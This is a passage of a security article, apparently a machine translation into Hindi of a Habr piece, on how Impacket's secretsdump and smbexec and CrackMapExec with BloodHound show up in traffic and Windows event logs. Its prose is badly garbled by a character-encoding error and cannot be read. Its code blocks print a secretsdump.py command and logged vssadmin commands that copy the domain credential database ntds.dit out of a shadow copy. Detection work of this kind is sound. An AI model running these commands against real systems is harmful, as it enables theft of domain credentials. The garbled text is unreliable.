 <i>1. winreg рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдХреЛ рдЦреЛрд▓рдирд╛</i> <br><br>  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЬрдм рдХреБрдВрдЬреА рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреА рд╣реИ, рддреЛ рдУрдкрдХреЛрдб 20 рдХреЗ рд╕рд╛рде SaveKey рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рдмрдЪрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрдореНрдкреЗрдХреЗрдЯ рдЗрд╕реЗ рдмрд╣реБрдд рд╡рд┐рд╢рд┐рд╖реНрдЯ рдмрдирд╛рддрд╛ рд╣реИред  рдпрд╣ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рди рдХреЛ рдмрдЪрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо .tmp рдХреЗ рд╕рд╛рде 8 рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рд╡рд░реНрдгреЛрдВ рдХрд╛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИред  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЖрдЧреЗ рдЕрдирд▓реЛрдбрд┐рдВрдЧ S32 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ System32 рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ (рдЫрд╡рд┐ 2) рд╕реЗ рд╣реЛрддрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>2. рджреВрд░рд╕реНрде рдорд╢реАрди рд╕реЗ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдпреЛрдЬрдирд╛</i> <br><br>  рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рд╣реИ рдХрд┐ рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдРрд╕реА рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдХреБрдЫ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╢рд╛рдЦрд╛рдУрдВ рдХреЛ рдЬреАрддрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдирд╛рдореЛрдВ, рдЖрджреЗрд╢реЛрдВ рдФрд░ рдЙрдирдХреЗ рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред <br><br>  рдпрд╣ рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдВрдбреЛрдЬ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рдореЗрдВ рдирд┐рд╢рд╛рди рднреА рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг рдпрд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдЖрджреЗрд╢ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  Windows Server 2016 рд▓реЙрдЧ рдЗрди рдореЗрдВ, рд╣рдо рдШрдЯрдирд╛рдУрдВ рдХреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореБрдЦреНрдп рдЕрдиреБрдХреНрд░рдо рджреЗрдЦреЗрдВрдЧреЗ: <br><br>  1. 4624 - рд░рд┐рдореЛрдЯ рд▓реЛрдЧрдиред <br>  2. 5145 - рд╕реБрджреВрд░ winreg рд╕реЗрд╡рд╛ рддрдХ рдкрд╣реБрдВрдЪ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рд╕рддреНрдпрд╛рдкрдиред <br>  3. 5145 - System32 рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдлрд╝рд╛рдЗрд▓ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪред  рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдКрдкрд░ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдирд╛рдо рд╣реИред <br>  4. 4688 - vssadmin рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рд╡рд╛рд▓реА cmd.exe рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдирд╛: <br><br><pre> <code class="bash hljs">тАЬC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдирд╛: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдирд╛: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдирд╛: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  рдХрдИ рдкреЛрд╕реНрдЯ-рд╢реЛрд╖рдг рд╕рд╛рдзрдиреЛрдВ рдХреА рддрд░рд╣, рдЗрдореНрдкреИрдХреЗрдЯ рдореЗрдВ рд░рд┐рдореЛрдЯ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП рдореЙрдбреНрдпреВрд▓ рд╣реИрдВред  рд╣рдо smbexec рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░реЗрдВрдЧреЗ, рдЬреЛ рдПрдХ рд░рд┐рдореЛрдЯ рдорд╢реАрди рдкрд░ рдПрдХ рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рд╢реЗрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред  рдЗрд╕ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрд┐рд╕реА рдкрд╛рд╕рд╡рд░реНрдб рдпрд╛ рдЙрд╕рдХреЗ рд╣реИрд╢ рдХреЗ рд╕рд╛рде SMB рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред  рдЕрдВрдЬреАрд░ рдореЗрдВред  3 рд╣рдо рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдРрд╕рд╛ рдЙрдкрдХрд░рдг рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ рдПрдХ рд╕реНрдерд╛рдиреАрдп рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХрдВрд╕реЛрд▓ рд╣реИред <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>3. рд╕реНрдордмреЗрдХреНрд╕реИрдХ рдЗрдВрдЯрд░рдПрдХреНрдЯрд┐рд╡ рдХрдВрд╕реЛрд▓</i> <br><br>  рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж smbexec рдореЗрдВ рдкрд╣рд▓рд╛ рдЪрд░рдг OpenSCManagerW рдХрдорд╛рдВрдб (15) рдХреЗ рд╕рд╛рде SCM рдЦреЛрд▓ рд░рд╣рд╛ рд╣реИред  рдЕрдиреБрд░реЛрдз рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИ: рдЗрд╕рдореЗрдВ, рдорд╢реАрди рдирд╛рдо рдлрд╝реАрд▓реНрдб рдХреЛ DUMMY рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>4. рд╕реЗрд╡рд╛ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрдХ рдЦреЛрд▓рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз</i> <br><br>  рдЗрд╕рдХреЗ рдмрд╛рдж, CreateServiceW (12) рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реЗрд╡рд╛ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред  рд╕реНрдореЗрдХрдПрдХреНрд╕ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╣рдо рд╣рд░ рдмрд╛рд░ рдЯреАрдо рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреЗ рдПрдХ рд╣реА рддрд░реНрдХ рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред  рдЕрдВрдЬреАрд░ рдореЗрдВред  5 рд╣рд░реЗ рд░рдВрдЧ рд╕реЗ рдХрдорд╛рдВрдб рдХреЗ рдЕрдкрд░рд┐рд╡рд░реНрддрдиреАрдп рдорд╛рдкрджрдВрдбреЛрдВ рдХрд╛ рд╕рдВрдХреЗрдд рдорд┐рд▓рддрд╛ рд╣реИ, рдкреАрд▓рд╛ - рд╣рдорд▓рд╛рд╡рд░ рдХреНрдпрд╛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИред  рдпрд╣ рдиреЛрдЯрд┐рд╕ рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реИ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо, рдЙрд╕рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрдореНрдкреЗрдХреЗрдЯ рдореЙрдбреНрдпреВрд▓ рдХреЗ рддрд░реНрдХ рдХрд╛ рдЙрд▓реНрд▓рдВрдШрди рдХрд┐рдП рдмрд┐рдирд╛ рдмрд╛рдХреА рдХреЛ рдФрд░ рдЕрдзрд┐рдХ рдХрдард┐рди рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>5. рд╕реЗрд╡рд╛ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рдмрдВрдзрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕реЗрд╡рд╛ рдмрдирд╛рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз</i> <br><br>  Smbexec рднреА рд╡рд┐рдВрдбреЛрдЬ рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдирд┐рд╢рд╛рди рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред  IPconfig рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реЗрдХреНрдЯрд┐рд╡ рд╢реЗрд▓ рдХреЗ рд▓рд┐рдП рд╡рд┐рдВрдбреЛрдЬ рд╕рд░реНрд╡рд░ 2016 рд▓реЙрдЧ рдореЗрдВ, рд╣рдо рдШрдЯрдирд╛рдУрдВ рдХреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдореБрдЦреНрдп рдЕрдиреБрдХреНрд░рдо рджреЗрдЦреЗрдВрдЧреЗ: <br><br>  1. 4697 - рдкреАрдбрд╝рд┐рдд рдХреА рдорд╢реАрди рдкрд░ рд╕реЗрд╡рд╛ рдХреА рд╕реНрдерд╛рдкрдирд╛: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - рдкреИрд░рд╛рдЧреНрд░рд╛рдл 1 рд╕реЗ рддрд░реНрдХреЛрдВ рдХреЗ рд╕рд╛рде cmd.exe рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдирд┐рд░реНрдорд╛рдгред <br>  3. 5145 - C $ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ __output рдлрд╝рд╛рдЗрд▓ рдкрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдБрдЪред <br>  4. 4697 - рдкреАрдбрд╝рд┐рдд рдХреА рдорд╢реАрди рдкрд░ рд╕реЗрд╡рд╛ рдХреА рд╕реНрдерд╛рдкрдирд╛ред <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - рдЕрдиреБрдЪреНрдЫреЗрдж 4 рд╕реЗ рддрд░реНрдХреЛрдВ рдХреЗ рд╕рд╛рде cmd.exe рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдирд╛ред <br>  6. 5145 - рд╕реА $ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ __output рдлрд╝рд╛рдЗрд▓ рдХреЗ рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЬрд╛рдБрдЪ рдХрд░рдирд╛ред <br><br>  рдЗрдВрдкреЗрдХреЗрдЯ, рд╣рдорд▓реЗ рдХреЗ рдЙрдкрдХрд░рдг рд╡рд┐рдХрд╕рд┐рдд рдХрд░рдиреЗ рдХреА рдиреАрдВрд╡ рд╣реИред  рдпрд╣ рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рдмреБрдирд┐рдпрд╛рджреА рдврд╛рдВрдЪреЗ рдореЗрдВ рд▓рдЧрднрдЧ рд╕рднреА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдЗрд╕рдХреА рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдВ рд╣реИрдВред  рдпрд╣рд╛рдБ рд╡рд┐рд╢рд┐рд╖реНрдЯ winreg рдЕрдиреБрд░реЛрдз рд╣реИрдВ, рдФрд░ SCM API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдорд╛рдВрдб рдХреЗ рдЪрд╛рд░рд┐рддреНрд░рд┐рдХ рдЧрдарди рдФрд░ рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рдкреНрд░рд╛рд░реВрдк рдФрд░ SMB рд╢реЗрдпрд░ SYSTEM32 рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред <br><br><h2>  CRACKMAPEXEC </h2><br>  CME рдЯреВрд▓ рдХреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЙрди рдирд┐рдпрдорд┐рдд рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ рдЖрдЧреЗ рдмрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рджрд░реНрд╢рди рдХрд░рдирд╛ рд╣реИред  рдпрд╣ рдЖрдкрдХреЛ рдХреБрдЦреНрдпрд╛рдд рдПрдореНрдкрд╛рдпрд░ рдПрдЬреЗрдВрдЯ рдФрд░ рдореАрдЯрд░рдкрд░рдЯрд░ рдХреЗ рд╕рд╛рде рдорд┐рд▓рдХрд░ рдХрд╛рдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред  рдЧреБрдкреНрдд рд░реВрдк рд╕реЗ рдЖрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реАрдПрдордИ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред  рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб (рдПрдХ рдЕрд▓рдЧ рдЦреБрдлрд┐рдпрд╛ рдЙрдкрдХрд░рдг) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд╕рдХреНрд░рд┐рдп рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╕рддреНрд░ рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред <br><br><h3>  рдЦреЛрдЬреА рдХреБрддреНрддрд╛ </h3><br>  рдПрдХ рд╕реНрд╡рддрдВрддреНрд░ рдЙрдкрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рднреАрддрд░ рдЙрдиреНрдирдд рдмреБрджреНрдзрд┐ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред  рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ, рдорд╢реАрдиреЛрдВ, рд╕рдореВрд╣реЛрдВ, рд╕рддреНрд░реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдбреЗрдЯрд╛ рдПрдХрддреНрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреЙрд╡рд░рд╢реЗрд▓ рдпрд╛ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдкрд░ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЖрддрд╛ рд╣реИред  LDAP рдпрд╛ SMB- рдЖрдзрд╛рд░рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реВрдЪрдирд╛ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рд╕реАрдПрдордИ рдПрдХреАрдХрд░рдг рдореЙрдбреНрдпреВрд▓ рдЖрдкрдХреЛ рдкреАрдбрд╝рд┐рдд рдХреЛ рдорд╢реАрди рд╕реЗ рд░рдХреНрддрдзреНрд╡рдЬ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ, рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдмрд╛рдж рдПрдХрддреНрд░ рдХрд┐рдП рдЧрдП рдбреЗрдЯрд╛ рдХреЛ рдЪрд▓рд╛рдиреЗ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХрдо рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред  рдЧреНрд░рд╛рдлрд┐рдХрд▓ рд╢реЗрд▓ рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдПрдХрддреНрд░рд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд░реЗрдЦрд╛рдВрдХрди рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рдЖрдкрдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдорд╢реАрди рд╕реЗ рдбреЛрдореЗрди рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЫреЛрдЯрд╛ рд░рд╛рд╕реНрддрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>6. рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдЗрдВрдЯрд░рдлрд╝реЗрд╕</i> <br><br>  рдкреАрдбрд╝рд┐рдд рдХреА рдорд╢реАрди рдкрд░ рдЪрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдореЙрдбреНрдпреВрд▓ ATSVC рдФрд░ SMB рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрд╛рд░реНрдп рдмрдирд╛рддрд╛ рд╣реИред  ATSVC рд╡рд┐рдВрдбреЛрдЬ рдЯрд╛рд╕реНрдХ рд╢реЗрдбреНрдпреВрд▓рд░ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ рд╣реИред  CME рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдХрд╛рд░реНрдп рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ NetrJobAdd (1) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред  CME рдореЙрдбреНрдпреВрд▓ рдХреНрдпрд╛ рднреЗрдЬрддрд╛ рд╣реИ рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдЕрдВрдЬреАрд░ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред  7: рдпрд╣ cmd.exe рдХреЗ рд▓рд┐рдП рдПрдХ рдХреЙрд▓ рд╣реИ рдФрд░ рдПрдХреНрд╕рдПрдордПрд▓ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рддрд░реНрдХреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрд╕реНрдкрд╖реНрдЯ рдХреЛрдб рд╣реИред <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>рдЪрд┐рддреНрд░ 7ред</i>  <i>рд╕реАрдПрдордИ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдХрд╛рд░реНрдп рдмрдирд╛рдирд╛</i> <br><br>  рдЯрд╛рд╕реНрдХ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдкреАрдбрд╝рд┐рдд рдХреА рдорд╢реАрди рдиреЗ рдмреНрд▓рдбрд╣рд╛рдЙрдВрдб рдХреЛ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛, рдФрд░ рдпрд╣ рдЯреНрд░реИрдлрд┐рдХ рдореЗрдВ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред  рдореЙрдбреНрдпреВрд▓ рдорд╛рдирдХ рд╕рдореВрд╣реЛрдВ, рдбреЛрдореЗрди рдореЗрдВ рд╕рднреА рдорд╢реАрдиреЛрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, SRVSVC NetSessEnum рдЕрдиреБрд░реЛрдз рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рддреНрд░реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП LDAP рдкреНрд░рд╢реНрдиреЛрдВ рдХреА рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИред <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>рдЕрдВрдЬреАрд░ред</i>  <i>8. SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛</i> <br><br>  рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдСрдбрд┐рдЯ рд╕рдХреНрд╖рдо рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рдд рдХреА рдорд╢реАрди рдкрд░ рд░рдХреНрддрдзреНрд╡рдЬ рдХрд╛ рдкреНрд░рдХреНрд╖реЗрдкрдг рдЖрдИрдбреА 4688 